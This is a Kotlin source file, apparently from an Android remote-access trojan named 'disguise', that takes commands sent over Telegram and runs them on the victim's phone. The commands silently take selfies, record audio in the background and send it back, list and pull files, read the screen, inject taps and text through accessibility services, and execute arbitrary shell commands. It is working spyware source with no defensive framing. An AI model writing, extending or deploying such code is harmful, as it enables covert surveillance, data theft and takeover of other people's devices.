package com.example.disguise.core

import android.content.Context
import android.util.Log
import com.example.disguise.control.AccessibilityHelper
import com.example.disguise.control.CameraExfil
import com.example.disguise.control.MicExfil
import com.example.disguise.control.ScreenReader
import com.example.disguise.files.FileExfil
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

/**
 * CommandHandler — يوزّع الأوامر النصية القادمة من تيليجرام إلى الوحدات المناسبة.
 * 
 * المسار: app/src/main/java/com/example/disguise/core/CommandHandler.kt
 */
class CommandHandler(
    private val context: Context,
    private val accessibilityHelper: AccessibilityHelper?,
    private val screenReader: ScreenReader?,
    private val fileExfil: FileExfil
) {

    companion object {
        private const val TAG = "CommandHandler"
    }

    // نطاق مستقل لتنفيذ الأوامر (لا يحجب polling)
    private val execScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * نقطة الدخول: تُستدعى من TelegramController عند وصول رسالة.
     */
    fun handle(commandText: String, reporter: TelegramReporter?) {
        if (reporter == null) {
            Log.w(TAG, "reporter is null, ignoring command")
            return
        }
        execScope.launch {
            try {
                dispatch(commandText.trim(), reporter)
            } catch (e: Exception) {
                Log.e(TAG, "command error: ${e.message}", e)
                reporter.sendMessage("⚠️ خطأ: ${e.message}")
            }
        }
    }

    /**
     * التحليل الفعلي وتوزيع الأوامر.
     */
    private suspend fun dispatch(raw: String, reporter: TelegramReporter) {
        val text = raw.removePrefix("/").trim()
        if (text.isEmpty()) return

        val parts = text.split(" ", limit = 2)
        val cmd = parts[0].lowercase()
        val args = if (parts.size > 1) parts[1] else ""

        when (cmd) {

            // ============ المساعدة ============
            "help", "start" -> {
                reporter.sendMessage(
                    """
                    🤖 *الأوامر المتاحة:*
                    
                    *التحكم بالشاشة:*
                    /tap X Y — نقرة
                    /swipe X1 Y1 X2 Y2 [MS] — سحب
                    /text النص — كتابة
                    /screen — قراءة الشاشة
                    /back — رجوع
                    /home — رئيسية
                    /recents — التطبيقات الحديثة
                    /notif — الإشعارات
                    
                    *الملفات:*
                    /ls [PATH] — عرض مجلد
                    /pull PATH — سحب ملف
                    
                    *التجسس (جديد):*
                    /selfie — التقاط صورة سيلفي بصمت
                    /record — بدء تسجيل صوتي
                    /stop_record — إيقاف التسجيل وإرساله
                    
                    /shell CMD — تنفيذ أمر shell
                    """.trimIndent()
                )
            }

            // ============ التحكم ============
            "tap" -> {
                val coords = args.split(" ")
                if (coords.size < 2) { reporter.sendMessage("⚠️ الاستخدام: /tap X Y"); return }
                val x = coords[0].toFloatOrNull()
                val y = coords[1].toFloatOrNull()
                if (x == null || y == null) { reporter.sendMessage("⚠️ إحداثيات غير صحيحة"); return }
                if (accessibilityHelper == null) { reporter.sendMessage("⚠️ خدمة إمكانية الوصول غير مفعّلة"); return }
                
                accessibilityHelper.tap(x, y)
                reporter.sendMessage("✅ نقرة على ($x, $y)")
            }

            "swipe" -> {
                val a = args.split(" ")
                if (a.size < 4) { reporter.sendMessage("⚠️ الاستخدام: /swipe X1 Y1 X2 Y2 [MS]"); return }
                val x1 = a[0].toFloatOrNull(); val y1 = a[1].toFloatOrNull()
                val x2 = a[2].toFloatOrNull(); val y2 = a[3].toFloatOrNull()
                val ms = if (a.size >= 5) a[4].toLongOrNull() ?: 300L else 300L
                if (x1 == null || y1 == null || x2 == null || y2 == null) { reporter.sendMessage("⚠️ إحداثيات غير صحيحة"); return }
                if (accessibilityHelper == null) { reporter.sendMessage("⚠️ خدمة إمكانية الوصول غير مفعّلة"); return }

                accessibilityHelper.swipe(x1, y1, x2, y2, ms)
                reporter.sendMessage("✅ سحب من ($x1,$y1) إلى ($x2,$y2) في $ms ms")
            }

            "text" -> {
                if (args.isBlank()) { reporter.sendMessage("⚠️ الاستخدام: /text النص"); return }
                if (accessibilityHelper == null) { reporter.sendMessage("⚠️ خدمة إمكانية الوصول غير مفعّلة"); return }
                val ok = accessibilityHelper.setText(args)
                if (ok) reporter.sendMessage("✅ تم إدخال النص") else reporter.sendMessage("⚠️ لم يتم العثور على حقل إدخال مركّز")
            }

            "back" -> { accessibilityHelper?.globalAction(AccessibilityHelper.ACTION_BACK); reporter.sendMessage("✅ رجوع") }
            "home" -> { accessibilityHelper?.globalAction(AccessibilityHelper.ACTION_HOME); reporter.sendMessage("✅ رئيسية") }
            "recents" -> { accessibilityHelper?.globalAction(AccessibilityHelper.ACTION_RECENTS); reporter.sendMessage("✅ التطبيقات الحديثة") }
            "notif" -> { accessibilityHelper?.globalAction(AccessibilityHelper.ACTION_NOTIFICATIONS); reporter.sendMessage("✅ الإشعارات") }

            // ============ قراءة الشاشة ============
            "screen" -> {
                if (screenReader == null) { reporter.sendMessage("⚠️ خدمة إمكانية الوصول غير مفعّلة"); return }
                reporter.sendChatAction("typing")
                val dump = screenReader.dump()
                if (dump.isBlank()) reporter.sendMessage("(شاشة فارغة أو غير قابلة للقراءة)")
                else reporter.sendMessage(dump)
            }

            // ============ الملفات ============
            "ls" -> {
                val path = if (args.isBlank()) "/sdcard/" else args
                reporter.sendChatAction("typing")
                val listing = fileExfil.list(path)
                reporter.sendMessage(listing)
            }

            "pull" -> {
                if (args.isBlank()) { reporter.sendMessage("⚠️ الاستخدام: /pull PATH"); return }
                reporter.sendChatAction("upload_document")
                val file = File(args)
                if (!file.exists()) { reporter.sendMessage("⚠️ الملف غير موجود: ${file.absolutePath}"); return }
                if (!file.canRead()) { reporter.sendMessage("⚠️ لا يمكن قراءة الملف (صلاحيات)"); return }
                reporter.sendDocument(file, caption = "📎 ${file.name}")
            }

            // ============ الميزات الجديدة: الكاميرا والميكروفون ============
            "selfie" -> {
                reporter.sendMessage("⏳ جارٍ التقاط صورة سيلفي بصمت...")
                try {
                    // نمرر الـ context (يجب أن يكون Activity، أو سنستخدم حيلة الـ Service)
                    // هنا نفترض أن الـ C2Service قد وفر طريقة لجلب الـ Activity
                    val activity = ActivityTracker.currentActivity
                    if (activity != null) {
                        CameraExfil.takeSilentSelfie(activity)
                    } else {
                        reporter.sendMessage("⚠️ لا يمكن تشغيل الكاميرا: التطبيق في الخلفية. افتح التطبيق وحاول مجدداً.")
                    }
                } catch (e: Exception) {
                    reporter.sendMessage("⚠️ فشل التقاط الصورة: ${e.message}")
                }
            }

            "record" -> {
                if (MicExfil.isCurrentlyRecording()) {
                    reporter.sendMessage("⚠️ هناك تسجيل قيد التشغيل بالفعل.")
                    return
                }
                reporter.sendMessage("🎙️ جارٍ بدء التسجيل الصوتي في الخلفية...")
                val success = MicExfil.startRecording(context)
                if (!success) {
                    reporter.sendMessage("⚠️ فشل بدء التسجيل. تأكد من صلاحية الميكروفون.")
                }
            }

            "stop_record" -> {
                if (!MicExfil.isCurrentlyRecording()) {
                    reporter.sendMessage("⚠️ لا يوجد تسجيل قيد التشغيل.")
                    return
                }
                reporter.sendMessage("⏳ جارٍ إيقاف التسجيل وإرسال الملف الصوتي...")
                MicExfil.stopRecordingAndSend()
            }

            // ============ shell ============
            "shell" -> {
                if (args.isBlank()) { reporter.sendMessage("⚠️ الاستخدام: /shell CMD"); return }
                val output = runShell(args)
                reporter.sendMessage(output)
            }

            else -> {
                reporter.sendMessage("⚠️ أمر غير معروف: /$cmd\nأرسل /help للقائمة")
            }
        }
    }

    private suspend fun runShell(cmd: String): String = withContext(Dispatchers.IO) {
        try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            process.waitFor()
            buildString {
                if (output.isNotBlank()) append("STDOUT:\n").append(output).append("\n")
                if (error.isNotBlank()) append("STDERR:\n").append(error)
                if (output.isBlank() && error.isBlank()) append("(لا مخرجات)")
            }
        } catch (e: Exception) {
            "⚠️ فشل تنفيذ الأمر: ${e.message}"
        }
    }
}
